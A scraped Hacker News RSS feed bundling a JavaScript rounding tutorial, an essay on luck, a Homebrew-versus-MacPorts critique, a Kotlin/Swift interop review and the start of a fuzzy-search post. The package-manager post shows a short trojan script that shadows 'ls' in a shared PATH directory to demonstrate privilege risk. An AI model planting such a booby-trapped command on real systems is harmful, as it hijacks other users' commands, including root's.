<pre><code><span>console</span>.log(<span>Math</span>.round(<span>1.4</span>));

<span>console</span>.log(<span>Math</span>.round(<span>1.6</span>));

<span>console</span>.log(<span>Math</span>.round(<span>1.5</span>)); 

<span>console</span>.log(<span>Math</span>.round(<span>-1.4</span>));

<span>console</span>.log(<span>Math</span>.round(<span>-1.6</span>));

<span>console</span>.log(<span>Math</span>.round(<span>-1.5</span>));

</code></pre>
<p>So, Math.round() can go both upward and downward depending on the fractional Part.</p>
<p><img src="https://i.ibb.co/YcZbNhd/mathfloor.png" alt=""></p>
<h2 id="mathtrunc">🎳 Math.trunc()</h2>
<p>There's another method available in JS Math object that is <code>Math.trunc()</code>. <code>Math.trunc()</code> returns the integer part of a number by removing any fractional part of the number.</p>
<pre><code><span>console</span>.log(<span>Math</span>.trunc(<span>1.4</span>));

<span>console</span>.log(<span>Math</span>.trunc(<span>1.6</span>));

<span>console</span>.log(<span>Math</span>.trunc(<span>-1.4</span>));

<span>console</span>.log(<span>Math</span>.trunc(<span>-1.6</span>));

</code></pre>
<h2 id="conclusion">Conclusion</h2>
<p>Rounding off numbers is an essential part of programming. I hope this article revisited your memories about different built-in rounding off methods we have in JavaScript. Leave an ❤ if you found this article helpful. 😊</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.nemotivity.xyz/lets-talk-about-mathceil-mathfloor-and-mathround-cke5vz93f013r9ds14gri50db</link>
            <guid isPermaLink="false">hacker-news-small-sites-24245272</guid>
            <pubDate>Sat, 22 Aug 2020 16:38:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get Lucky: Less Chance, More Chances]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24245160">thread link</a>) | @dickiebush
<br/>
August 22, 2020 | https://www.dickiebush.com/articles/how-to-get-lucky-less-chance-more-chances | <a href="https://web.archive.org/web/*/https://www.dickiebush.com/articles/how-to-get-lucky-less-chance-more-chances">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="44" id="block-yui_3_17_2_1_1598060086803_34477"><div><blockquote>
<p>“The amount of good luck coming your way depends on your willingness to act.” – Barbara Sher</p>
</blockquote>
<p>Luck has nothing to do with chance. Luck has everything to do with <em>chances.</em></p>
<p>Getting lucky is a skill. The people we consider lucky are simply better at it than others. They get lucky for a reason - and it’s not the rabbit’s foot in their pocket.</p>

<p>Luck is not winning the lottery or finding a pot of gold. This is <strong><em>chance</em></strong>, not luck.</p>
<p>Getting lucky is about seizing opportunity. The luckiest people have <strong><em>more opportunities</em></strong> and <strong><em>consistently seize them.</em></strong></p>
<p>To visualize luck in action, picture yourself as a target in a wide-open field. On the other side of the field stands an archer, firing arrows toward you. Each of these arrows is one of life's opportunities. Each arrow that hits your target is an opportunity seized.</p>
<p>Trying to land one of these opportunities, you set up in the middle of the field, patiently waiting for one to fall.</p>
<p>But the field you're on has only one archer, and they have horrendous aim. On top of that, you're a small target, sitting hundreds of yards away. For all you know, it could be months before an arrow falls anywhere close, let alone hits you.</p>
<p>This may be how you think about luck - which is why you never get lucky. You see luck as a game of chance, a game over which you have little control.</p>
<p>Lucky people have a different outlook. They see luck as a game of skill, a game over which they have <em>all</em> the control.</p>
<p>First, lucky people don't set themselves up in an open field with one novice archer. They search for the field with hundreds of expert archers and set themselves up there. This way, arrows are whizzing all around them. This gives them <strong><em>more opportunities.</em></strong></p>
<p>Second, lucky people don’t settle for being a small target. The best archers in the world will still struggle to hit a target if it’s too small. So lucky people spend their time becoming a bigger target. This helps them <strong><em>seize more opportunities.</em></strong></p>
<p>Both steps are important. The biggest target in the world will never get hit by a novice archer. And even hundreds of expert archers will struggle to hit a super small target.</p>
<p>To get lucky, you need to have more opportunities and make it easier to seize them.</p>

<blockquote>
<p>“Good luck is when opportunity meets preparation, while bad luck is when lack of preparation meets reality.” – Eliyahu Goldratt</p>
</blockquote>
<p>Since getting lucky is a skill, you can get better at it. Guided by the following mental models, you can make decisions and take actions to put you on the path to getting lucky.</p>
<h3 id="george-s-razor"><strong>George's Razor</strong></h3>
<p>When making a decision, choose the path that leads to more luck. Make the decision that involves talking to more people, exploring a new area, or learning new skills.</p>
<p>For example, say it’s Saturday night and you have plans to meet up with two new people. It’s 7:30, pouring rain, and you’re hoping they’re the ones to cancel. But the alternative is six episodes of something on Netflix. Which do you choose?</p>
<p>George’s Razor says you grab your umbrella and head out. It might not be this one, but eventually one of these decisions will lead to new opportunities.</p>
<p>To get lucky, consistently make the luckier choice.</p>
<h3 id="leverage"><strong>Leverage</strong></h3>
<p>Time, energy, and attention are scarce resources. To get more out of them, you need to leverage them.</p>
<p>Compared to regular activities, high leverage activities lead to more opportunities for the same amount of input. The more time, energy, and attention you spend on these activities, the more opportunities you will have.</p>
<p>For example, consider how you spend two hours on a Sunday afternoon. You could spend those two hours on a Zoom meeting with someone new. This would lead to meeting one new person every week, slowly but steadily increasing your opportunities.</p>
<p>Or, you could spend two hours writing a <a href="http://dickiebush.substack.com/">weekly newsletter</a>, conversing with hundreds of people in the same amount of time. This leads to meeting hundreds of people every week. And you’ll probably meet their friends too, and their friend’s friends.</p>
<p>To get lucky, leverage your time, energy, and attention.</p>
<h3 id="fat-tails"><strong>Fat Tails</strong></h3>
<p>There are two ways to model the world - normal distributions (bell curves) and power law distributions (80/20 curves). Nassim Taleb has made a career about explaining the differences, so I'll leave the technical details to him.</p>
<p>The simplest example is weight versus wealth. If you took every person in New York City and sorted them by their weight, it would look like a bell curve. Most people would fall in the middle, with a few very heavy people and very light people on the edges. At most, the heaviest person would be 10 times the weight of the lightest person.</p>
<p>But if you sorted every person by wealth, it would look like an 80/20 curve. Almost everyone would fall on the far left of the distribution. But the wealthiest person would be way out on the right edge. In this distribution, the wealthiest person isn't 10 times as wealthy as the poorest person, they are 10 million times as wealthy. The wealth distribution has <em>fat tails.</em></p>
</div></div><div data-block-type="44" id="block-yui_3_17_2_1_1598060086803_61325"><div><p>Lucky people focus on these fat tails. They understand that the best opportunities aren't worth 10 times more than the average, but 10 million times more. So they do everything possible to expose themselves to them.</p>
<p>To get lucky, focus on the fat tails.</p>
<h3 id="serendipity-vehicles"><strong>Serendipity Vehicles</strong></h3>
<p>For opportunities to find you, you need to be easy to find. Being easy to find leads to serendipity - those encounters and opportunities that happen purely due to chance.</p>
<p>To be easy to find, you need a <em>serendipity vehicle</em> - something you create that makes it easy for others to find you. Your serendipity vehicle should be something you produce regularly that shows other people what you're interested in. This makes it easy for people to see that you view the world the same way they do.</p>
<p>The easiest way is to start by sharing the work <a href="http://dickiebush.com/articles/sharing">you're already doing</a>. The two best ways to do this are to <a href="http://dickiebush.substack.com/subscribe">start a weekly newsletter</a> and <a href="http://twitter.com/dickiebush">tweet about what you're working on</a>. You'll be surprised how many like-minded individuals will find you when you start sharing this way.</p>
<p>To get lucky, start a serendipity vehicle.</p>

<p>Few people are willing to credit the role of luck in their life. Acknowledging how lucky they've been would cut against the story they tell themselves about their success. It was their 90-hour weeks, relentless focus, and pure determination that brought about their success, not luck.</p>
<p>But this is the wrong way to think about it.</p>
<p>Instead, your goal should be for everyone to think you got lucky, knowing in fact you did. But only because you had more opportunities, and did a better job seizing them.</p>

<p>It has never been easier to get lucky. The internet has unlocked opportunities on an unimaginable scale. Better yet, you can quickly set yourself to ensure those opportunities find you.</p>
<p>To seize them, make the lucky choice, seek leverage, focus on the fat tails, and start a serendipity vehicle.</p>
<p>Best of luck.</p>
<hr>
<p>Thank you to the <a href="http://twitter.com/compoundwriting">Compound Writing</a> members who reviewed this post: <a href="https://twitter.com/_rossgordon">Ross Gordon,</a> <a href="https://twitter.com/SonOfSunTzu">Nick Drage</a>, <a href="https://twitter.com/tylerwince">Tyler Wince</a>, <a href="https://twitter.com/dan2hunt">Dan Hunt</a>, <a href="https://twitter.com/DruRly">Dru Riley</a>, and <a href="https://www.tomwhitenoise.com/">Tom White</a></p>
<p>To learn more about George's Razor, listen to this episoe of <a href="https://podcasts.apple.com/gb/podcast/069-george-macgill-mental-models-101-how-to-make-better/id1347973549?i=1000437298285">Modern Wisdom</a>. </p>
<p>For more on fat tails, read <a href="https://taylorpearson.me/luck/">Taylor Pearson on How to Get Lucky</a>. </p>
<p>For more on serendipity vehicles, read <a href="https://www.perell.com/blog/serendipity#:~:text=Maintain%20a%20website%20so%20people,are%20the%20foundation%20of%20serendipity.">David Perell on How to Maximize Serendipity</a></p>
</div></div></div>]]>
            </description>
            <link>https://www.dickiebush.com/articles/how-to-get-lucky-less-chance-more-chances</link>
            <guid isPermaLink="false">hacker-news-small-sites-24245160</guid>
            <pubDate>Sat, 22 Aug 2020 16:25:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on macOS Package Managers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24245150">thread link</a>) | @simonebrunozzi
<br/>
August 22, 2020 | https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/ | <a href="https://web.archive.org/web/*/https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><header>
	
	<p><time>Friday, April 26, 2019</time></p>
</header>
<section>
	<p>A couple of months ago, I uninstalled <a href="https://brew.sh/">Homebrew</a> and migrated my configuration to <a href="https://www.macports.org/">MacPorts</a>. I’ve been doing a lot of thinking about the state of package management on macOS, and here’s what I’ve come up with based on my experiences using both and interacting with their development communities.</p>

<h2 id="a-brief-history-of-package-managers-on-macos">A brief history of package managers on macOS</h2>

<p>Package management on macOS has a somewhat complex history, mostly owing to the fact that unlike most Linux distributions, macOS does not ship with a default package manager out of the box. It’s not surprising that one of the first projects to solve the problem of package management, <a href="http://www.finkproject.org/">Fink</a>, was created very early, with its initial releases predating that of Mac OS X 10.0 by several months. Using Debian’s dpkg and APT as its backend, Fink is still actively maintained, though I haven’t looked at it very closely.</p>

<p>MacPorts, on the other hand, was released in 2002 as part of <a href="https://en.wikipedia.org/wiki/Darwin_(operating_system)#OpenDarwin">OpenDarwin</a>, while Homebrew was released seven years later as a “solution” to many of the shortcomings that the author saw in MacPorts. In case it isn’t obvious from the introduction, it’s these two that we’ll be talking about. Sorry, Fink :(</p>

<h2 id="architecture">Architecture</h2>

<p>While both MacPorts and Homebrew try to solve the same problem, they really are designed quite differently from each other. These differences become immediately evident once you start using them: I personally feel that MacPorts is clearly the better architected, more mature package manager of the two.</p>

<h3 id="to-sudo-or-not-to-sudo">To <code>sudo</code> or not to <code>sudo</code></h3>

<p>Homebrew makes several questionable design decisions, but one of these deserves its own section: the choice to <a href="https://github.com/Homebrew/brew/blob/21bb9f6f5b535c35e1c3e5c1e2327c46d5756e80/docs/FAQ.md#why-does-homebrew-say-sudo-is-bad">explicitly eschew root</a> (in fact, it will refuse to work at all if run this way). This fundamentally is a <em>very bad idea</em>: package managers that install software for all users of your computer, as Homebrew does by default, should <em>always</em> require elevated privileges to function correctly. This decision has important consequences for both security and usability, especially with the advent of System Integrity Protection in OS X El Capitan.</p>

<p>For quite a while, Homebrew essentially considered itself the owner of <code>/usr/local</code> (both metaphorically and literally, as it would change the permissions of the directory), to the point where it would do things like plop its README down directly into this folder. After rootless was introduced, it moved most of its files to subdirectories; however, to maintain the charade of “sudo-less” installation, Homebrew will still trash the permissions of folders inside <code>/usr/local</code>. Homebrew’s <a href="https://github.com/Homebrew/brew/blob/2be7999878702554f1e1b5f4118978e670e6156c/docs/Troubleshooting.md#check-for-common-issues">troubleshooting guide</a> lists these out, because reinstalling macOS sets the permissions back to what they’re supposed to be and breaks Homebrew in the process:</p>

<blockquote>
  <p>If commands fail with permissions errors, check the permissions of <code>/usr/local</code>’s subdirectories. If you’re unsure what to do, you can run <code>cd /usr/local &amp;&amp; sudo chown -R $(whoami) bin etc include lib sbin share var opt Cellar Caskroom Frameworks</code>.</p>
</blockquote>

<p>Telling users to use <code>sudo</code> as a hammer to smash permissions “issues” that arise as a result of the system trying to fix damage caused by supposedly “sudo-less” software is quite ironic (and this is a bad practice in and of itself: it’s teaching users to fix problems by blindly running <code>sudo chown -R</code>). But really, this is <em>bad, bad</em> advice. Not only does this make Homebrew completely unusable for multi-user systems, it opens up a security hole (actually, <a href="https://medium.com/0xcc/rootpipe-reborn-part-i-cve-2019-8513-timemachine-root-command-injection-47e056b3cb43">multiple</a>): with <code>/usr/local/bin</code> being shared (and the first in <code>$PATH</code>!!), it’s not hard to see how changing the permissions on this directory leads to trouble. Consider a malicious shell script running with the privileges of the current user (perhaps something <a href="https://brew.sh/#install">you found on the internet</a>?) that makes a file at <code>/usr/local/bin/ls</code>:</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>if</span> <span>[[</span> <span>$(</span><span>id</span> <span>-u</span><span>)</span> <span>-eq</span> 0 <span>]]</span><span>;</span> <span>then
	</span><span>echo </span>pwned <span># you didn't happen to run "sudo ls", did you?</span>
<span>else
	</span><span>ls</span> <span>"</span><span>$@</span><span>"</span> <span># move along, nothing to see here</span>
<span>fi</span>
</code></pre></div></div>

<p>Boom, now <code>ls</code> is booby-trapped for everyone on the system.</p>



<h3 id="the-macports-philosophy">The MacPorts philosophy</h3>

<p>MacPorts, on the other hand, swings so far in the other direction that it’s actually borderline inconvenient to use in some sense. Philosophically, MacPorts has a very different perspective of how it should work: it tries to prevent conflicts with the system as much as possible. To achieve this, it sets up a hierarchy under <code>/opt</code> (which is the annoying bit, because this directory is not on <code>$PATH</code> by default, nor is picked up by compilers without some prodding).</p>

<p>Of course, this design means that there is a single shared installation is among users, so running <code>port</code> requires elevated privileges whenever performing an operation that affects all users (which, admittedly, is most of the time). MacPorts is smart about this, though: it will shed permissions and run as the <code>macports</code> user whenever possible.</p>

<p>In line with their stated philosophy to prevent conflicts with macOS, MacPorts will set up its own tools in isolation from those provided by the system (in fact, builds run in “sandboxes” under the <code>macports</code> user, where attempts to access files outside of the build directory–which includes system tools–are intercepted and blocked). This means MacPorts needs to install some “duplicate” tools (whereas Homebrew will try to use the ones that come with your system where possible), the downside of which is that there is an one-time “up-front” cost as it installs base packages. The upside is that this approach is significantly more contained, which makes it easier to manage and more likely to continue working as macOS changes under it.</p>

<p>Finally, MacPorts just seems to have a lot of thought put into it with regards to certain aspects: for example, <a href="https://guide.macports.org/chunked/internals.registry.html">the MacPorts Registry database</a> is backed by SQLite by default, which makes easily introspectable in case something goes wrong. Another useful feature is built-in “livechecks” for most ports, which codify upstream version checks and make it easy to see when MacPorts’s package index need to be updated.</p>

<h2 id="day-to-day-usage">Day-to-day usage</h2>

<p>Architecture aside, a package manager is only useful if it’s possible to actually use it. There are a couple of subareas that I feel are important, and we’ll look at how each package manager does for each in turn.</p>

<h3 id="package-availability">Package availability</h3>

<p>Nominally, MacPorts has <a href="https://www.macports.org/ports.php?by=all">over 20,000 ports</a> ports available to install by default, while Homebrew has <a href="https://formulae.brew.sh/formula/">just shy of 5,000</a> formulae (plus a couple thousand more in homebrew/cask). Of course, the only thing this really tells us is that both of them have a <em>lot</em> of packages; both of these numbers are pretty meaningless as they contain things like versioned packages and other kinds of number-inflation. If you are looking for a popular, established package, neither will disappoint: packages like <code>gcc</code>, <code>vim</code>, and <code>wget</code> are available and up-to-date on both MacPorts and Homebrew.</p>

<p>Where availability starts to differ is with lesser-used packages: MacPorts seems to have quite a few older packages that Homebrew never picked up, while Homebrew is more likely to have newer packages. Homebrew’s are slightly more up-to-date, but I think this is likely a result of having fewer packages to manage and more support to do this job, as well as an increased proclivity to remove packages that are hard to get working on the latest version of macOS. Overall, I don’t think it’s fair to say that either package manager has an advantage here; ultimately this comes down to what you will end up needing. If you’re switching between the two, it’s almost guaranteed that there’s going to be something that’s conspicuously missing from the new package manager to annoy you ;)</p>

<h3 id="usability">Usability</h3>

<p>Homebrew aims to be simple and easy to use, and in general this is true. While I’m neutral on the use of beer-related terminology and emoji, the judicious use of color is quite helpful, as is the well-formatted output. Most common usecases are straightforward, though occasionally commands can end up doing surprising things if you use them in strange ways.</p>

<p>MacPorts, on the other hand, is by no means unusable, but it’s not as polished as Homebrew is. The lack of color, as well as somewhat more cluttered and less relevant output, makes it a bit less pleasant to work with (I have a couple of patches that I apply to get the behavior I want, but expecting most users to do this is unreasonable of course). However, overall, MacPorts handles being more complex quite well, and should be pretty serviceable for most users–especially those who have used another package manager.</p>

<p>The two package mangers differ in how they distribute packages: MacPorts almost always builds packages from source, while Homebrew has continuously gotten less and less permissive of letting you do this (opting instead for downloading pre-built binaries). From a usability perspective, binaries are a clear winner: packages install much quicker and are usable nearly immediately, and you don’t leave your computer barely usable because it’s been compiling the newest version of LLVM for the last four hours. Overall, however, this is less of a problem than it may seem at first, since most package are small and build relatively quickly, making long <code>port upgrade outdated</code> invocations quite rare.</p>

<h3 id="features">Features</h3>

<p>While both package managers have the basic functionality you’d expect from a package manager, MacPorts is generally much more full featured than Homebrew is. Part of this is probably a result of architectural disparities, one example of which being that Homebrew’s set of commands to manage the dependency tree is somewhat limited. While this is unfortunate, having these limitations is somewhat reasonable given the underlying design, which would make implementing these features difficult.</p>

<p>Less justifiable is Homebrew’s habit of missing useful but slightly less-commonly used functionality (some of which have been mentioned above), and in extreme cases <em>removing</em> features entirely, or crippling them so that they are significantly less usable. Into this dubious category goes useful functionality like the ability to find and …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/">https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/</a></em></p>]]>
            </description>
            <link>https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24245150</guid>
            <pubDate>Sat, 22 Aug 2020 16:23:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Ergonomics Review of Using Kotlin from Swift]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24245007">thread link</a>) | @pcr910303
<br/>
August 22, 2020 | https://benasher.co/kotlin-ios-ergonomics/ | <a href="https://web.archive.org/web/*/https://benasher.co/kotlin-ios-ergonomics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <section>
  <div>
    <div>
      <article>
        
        
        
        <h6>16 Aug 2020

- <span>13 minute read</span>


</h6>
        
        <p>At Autodesk, my colleagues and I are more than a year and a half into our Kotlin multiplatform (KMP) shared library journey. That’s one Kotlin shared library, shared among our three mobile platforms that we support for the PlanGrid app (iOS, Android, and Windows).</p>

<p>Most new feature development for the PlanGrid app starts in the shared library now. It has become so much an extension of our main application that we’re planning a move to a mono-repo (iOS, Android, Windows, and the KMP shared library all in one place) later this year, which will help solve some of our scale issues (great problem to have all things considered).</p>

<h2 id="making-it-work">Making it Work</h2>

<p>Looking back, there were a few things that made Kotlin work well for us that have to do with a combination of developer experience and our team. Early on, the few of us working on the proof-of-concept and pitching KMP to the rest of the team focused on developer experience. We ensured that integrating our experiment wouldn’t get in the way of day-to-day work by distributing it to iOS as a binary framework via CocoaPods (already integrate other binary frameworks this way without issue).</p>

<p>While testing out KMP-based functionality alongside all of the other work going on, we made use of feature flags in case shit hit the fan in production. Once we had our foot in the door, had proved things worked well, and had come up with a plan for how the library was going to evolve, the next step was getting people to adopt the shared library for their teams’ features.</p>

<p>This again takes us back to developer experience. Lucky for us, KMP comes with iOS interop out-of-the-box. It’s so good that one of my colleagues thought they were using some kind of bridging layer that we must have written to make Kotlin feel Swift-y. When they command-clicked through to source, they were surprised to find the KMP-generated shared library header.</p>

<h3 id="having-a-good-team-helps">Having a Good Team Helps</h3>

<p>Did I mention we have a Windows team? For that side of things, we got lucky. The level of support from KMP you get for Windows does not measure up to what you get for iOS. On the Windows side, my colleagues would like to have a C# library in the style of the KMP-generated Obj-C library with the nice, generated headers that we get on iOS. Instead, they get a library that uses C-interop— quite a different experience. Fortunate for us, a few folks on our Windows team were experienced and interested enough to write and maintain their own C# code generation on top of that. We hope to open source it later this year.</p>

<h2 id="looking-at-interop">Looking at Interop</h2>

<p>To recap, these elements made it possible for KMP to work well for us:</p>

<ol>
  <li>Ease of integration on iOS and Android</li>
  <li>Ergonomic interop out-of-the-box for iOS</li>
  <li>Colleagues on our Windows team willing to take on the challenge of solving the interop issues there</li>
</ol>

<p>If I could only pick one, it would be the interop on iOS that allowed this to become as successful as it has for us. It would be a much tougher sell, for example, had both the iOS and Windows teams needed to spend loads of effort on interop.</p>

<p>My favorite example of this great interop is one from <a href="https://benasher.co/kotlin-ios-getting-started-interop/">my earlier post</a>, where Phill and I wrote about the iOS interop:</p>

<figure><pre><code data-lang="kotlin"><span>// Kotlin</span>
<span>enum</span> <span>class</span> <span>LogLevel</span> <span>{</span>
    <span>ERROR</span><span>,</span>
    <span>WARNING</span><span>,</span>
    <span>INFO</span><span>,</span>
    <span>DEBUG</span>
<span>}</span>

<span>class</span> <span>Logger</span> <span>{</span>
    <span>companion</span> <span>object</span> <span>default</span> <span>{</span>
        <span>fun</span> <span>log</span><span>(</span><span>level</span><span>:</span> <span>LogLevel</span> <span>=</span> <span>LogLevel</span><span>.</span><span>ERROR</span><span>,</span> <span>message</span><span>:</span> <span>String</span><span>,</span> <span>completion</span><span>:</span> <span>(</span><span>Boolean</span><span>)</span> <span>-&gt;</span> <span>Unit</span><span>)</span> <span>{</span> <span>}</span>
    <span>}</span>
<span>}</span></code></pre></figure>

<figure><pre><code data-lang="swift"><span>// Swift</span>
<span>Logger</span><span>.</span><span>default</span><span>.</span><span>log</span><span>(</span><span>.</span><span>error</span><span>,</span> <span>"An error ocurred"</span><span>)</span> <span>{</span>
    <span>// Closure</span>
<span>}</span></code></pre></figure>

<p>This example highlights some idiomatic Kotlin that allows you to write idiomatic-looking Swift. It’s impressive. However, this example has a secret. It also highlights many of the areas where Kotlin/Native interop with iOS has room for improvement. With Kotlin 1.4.0 out the door, I hope now is a good time to raise these issues. Fixing them would take the sell to iOS teams to the next level, at least in terms of having excellent interop. I’ll discuss the issues in increasing in order of how long it took our team to notice and bump into them.</p>

<h3 id="exhaustive-enums">Exhaustive Enums</h3>

<p>This is one of the earliest areas, for which I filed <a href="https://github.com/JetBrains/kotlin-native/issues/2521">an issue</a> in the Kotlin/Native GitHub. Enums are a great way to describe an input for an API, such as the above log method. However, we ran into problems with Kotlin enums as soon as we wanted to do an exhaustive <code>switch</code> (equivalent to exhaustive <code>when</code> in Kotlin) over them in Swift.</p>

<p>The problem lies in how enums are represented in Kotlin compared to Obj-C (remember Swift is irrelevant for comparison— interop is via Swift-y feeling Obj-C). Enums in Kotlin are reference types (a special <code>class</code>). In Obj-C, they’re integers. Attempting to <code>switch</code> over them from Swift would be like trying to <code>switch</code> over any other class instance that you defined in Swift, for example. The Swift compiler doesn’t know that there happens to be a finite number of instances of that <code>enum class</code> like Kotlin does.</p>

<p>There is a workaround though that can improve the ergonomics a bit. You can define a matching C-style enum (with a matching name), and <a href="https://github.com/JetBrains/kotlin-native/issues/2521#issuecomment-453009890">redefine the ordinal property</a> as having that type. At Autodesk, we do this with a bit of fragile (albeit has worked in our codebase with only one minor tweak since its creation) code generation that adds these C-style enums to the Obj-C framework header as Obj-C extensions on all of our enum types. With that, we get exhaustive <code>switch</code> for all of our Kotlin enums, by doing a <code>switch</code> over the ordinal property.</p>

<p>In the above sample code, you can see there’s no problem passing enums around. You wouldn’t have any idea about how Kotlin enums are represented, until you go to <code>switch</code> on one.</p>

<h3 id="companion-objects">Companion Objects</h3>

<p>In <a href="https://benasher.co/kotlin-ios-getting-started/">my first article</a>, I mentioned how, as an iOS developer, I found the <code>companion object</code> a bit strange at first, but I get it now. As my iOS colleagues have become better acquainted with them, we have begun to see them more often in our shared library. The problem comes if you don’t know that you can name a <code>companion object</code>, like in the above example. Unnamed ones are more common, in my experience. Here is what the Swift code would look like, if we hadn’t named the above <code>companion object</code> “default”:</p>

<figure><pre><code data-lang="swift"><span>// Swift</span>
<span>Logger</span><span>.</span><span>Companion</span><span>()</span><span>.</span><span>log</span><span>(</span><span>.</span><span>error</span><span>,</span> <span>"An error ocurred"</span><span>)</span> <span>{</span>
    <span>// Closure</span>
<span>}</span></code></pre></figure>

<p>As someone who writes a lot of Swift, this looks funny at first. Are we creating a new <code>Logger.Companion</code>? If so, where can I see what this does in Kotlin? The ergonomics of the unnamed <code>companion object</code> is another issue that <a href="https://github.com/JetBrains/kotlin-native/issues/2757">I filed early on</a>. To answer the question, <a href="https://github.com/JetBrains/kotlin-native/issues/2757#issuecomment-472866293">you aren’t creating a new</a> <code>Logger.Companion</code>.</p>

<p>The fix here isn’t straightforward. You can convince your team to prefer naming a <code>companion object</code>, but that doesn’t always make sense, if say your goal is to use a <code>companion object</code> to namespace a public constant. Solutions discussed in the ticket would be breaking changes. That said, I think improving the ergonomics here would be an easy way to prevent less enthusiastic iOS developers from having this easy (and small) thing to point at. At Autodesk, we just acknowledge this quirk of the Obj-C export and move on. But, that’s easy for us to do now, as we have a critical mass.</p>

<h3 id="default-arguments">Default Arguments</h3>

<p>Although we bumped into this one later on, a fix for this would make the biggest difference for our team right now because our dependence on KMP has grown. If you notice in the above Kotlin, the log function has a default argument. However, you cannot use that default argument from Swift. As a log parameter, this might not be that important. In other contexts though, this could be a default integer parameter, for example. In that case, it can be near impossible to know what argument you should pass in the “default” case. To avoid bugs, your best bet is to go back to the Kotlin source and find the answer.</p>

<p>Though, I’ve heard folks say: but Swift supports default arguments, why shouldn’t this work? This is often the first place folks begin to internalize that this doesn’t matter. The interop is via Obj-C, so all that matters is what Obj-C supports. You can repeat this same answer for a bevy of similar complaints. <code>Interface</code> extensions? Swift supports the equivalent <code>protocol</code> extensions. Obj-C does not. Optional primitive types? Obj-C doesn’t have those either. None of this is a knock on Kotlin/Native’s interop, which again is great! Obj-C interop was the correct and stable choice at the time, as that was before Swift had a stable ABI. I made comments about this in my previous <a href="https://benasher.co/kotlin-ios-getting-started-interop/">interop article</a>, so let’s go back to the issue at hand.</p>

<p>Default arguments have a solution in Kotlin/JVM interop, which is used in hand-written Obj-C as well: <a href="https://youtrack.jetbrains.com/issue/KT-38685">generated overloads</a>. Generating overloads for C and Obj-C KMP libraries would be a huge improvement to Kotlin/Native’s export facilities. I hope with Kotlin 1.4.0 out the door, time can be made for this one.</p>

<h3 id="enums---missing-exports">Enums - Missing Exports</h3>

<p>I want to go back to enums for a moment. I mentioned that I would review the issues in the order that my team ran into them. After getting more comfortable using Kotlin enums in our code, we began to come up with cases where we wanted to enumerate Kotlin enums. However, the needed <code>values()</code> function <a href="https://youtrack.jetbrains.com/issue/KT-38530">is not exported to Obj-C by default</a>. If you need this, you’re left to define it yourself in your library and have it call the equivalent function. The workaround is fine, but it gets in the way, when the library you’re using is one that’s already packaged up and distributed. A fix requires another PR and waiting on another CI deploy.</p>

<h3 id="translation-to-obj-c-primitives">Translation to Obj-C Primitives</h3>

<p>The final one I want to talk about is the most minor, but we do come across it on occasion. In the above example, we are hiding the fact that the completion closure has one parameter. It’s a Kotlin <code>boolean</code>, but it is translated to Obj-C as a <code>KotlinBoolean</code> <code>class</code>. This is bound to happen if the type is optional. Again, Obj-C doesn’t support optional primitives. In this case however, it’s not. It should be a <code>BOOL</code> …</p></article></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://benasher.co/kotlin-ios-ergonomics/">https://benasher.co/kotlin-ios-ergonomics/</a></em></p>]]>
            </description>
            <link>https://benasher.co/kotlin-ios-ergonomics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24245007</guid>
            <pubDate>Sat, 22 Aug 2020 16:05:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Fast Fuzzy Search Implementation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24244971">thread link</a>) | @pcr910303
<br/>
August 22, 2020 | https://www.objc.io/blog/2020/08/18/fuzzy-search/ | <a href="https://web.archive.org/web/*/https://www.objc.io/blog/2020/08/18/fuzzy-search/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>  <div> <p>In recent episodes of Swift Talk, we’ve been building a <a href="https://talk.objc.io/collections/quick-open">fast fuzzy search implementation</a>. Fuzzy search is typically used to search a large list of file names by typing a few relevant characters (like Open Quickly in Xcode). For example, to find a file named <code>Sources/Slides/ContentView.swift</code>, you might type <code>SSCV</code>. The simplest version of a fuzzy search algorithm could be implemented using a regular expression: for the search string <code>SSCV</code>, the regular expression would be something like <code>*S*S*C*V*</code>. In other words, it needs to match the characters <code>SSCV</code>, in that order, but with any number of other characters before, after or in between the characters.</p> <p>Here’s another simple implementation:</p> <pre><code>extension String {
    func fuzzyMatch(_ needle: String) -&gt; Bool {
        if needle.isEmpty { return true }
        var remainder = needle[...]
        for char in self {
            if char == remainder[remainder.startIndex] {
                remainder.removeFirst()
                if remainder.isEmpty { return true }
            }
        }
        return false
    }
}
</code></pre> <p>The code works well and is quite fast in an optimized build. We can improve performance by comparing the <code>UTF8View</code> of both strings instead of their characters. This might return some incorrect results if your strings contains things like combining sequences, but is typically not a problem when searching files.</p> <h2>Scoring</h2> <p>The algorithm works very well if all you want to know is whether a filename matches the search string, but in most fuzzy search implementations you’re searching a list of files, and want to rank them by how well they match. Consider the following two file names, which both match <code>string</code>:</p> <pre><code>source/test/regression/graph.swift
^      ^    ^      ^ ^ ^

source/string.swift
       ^^^^^^
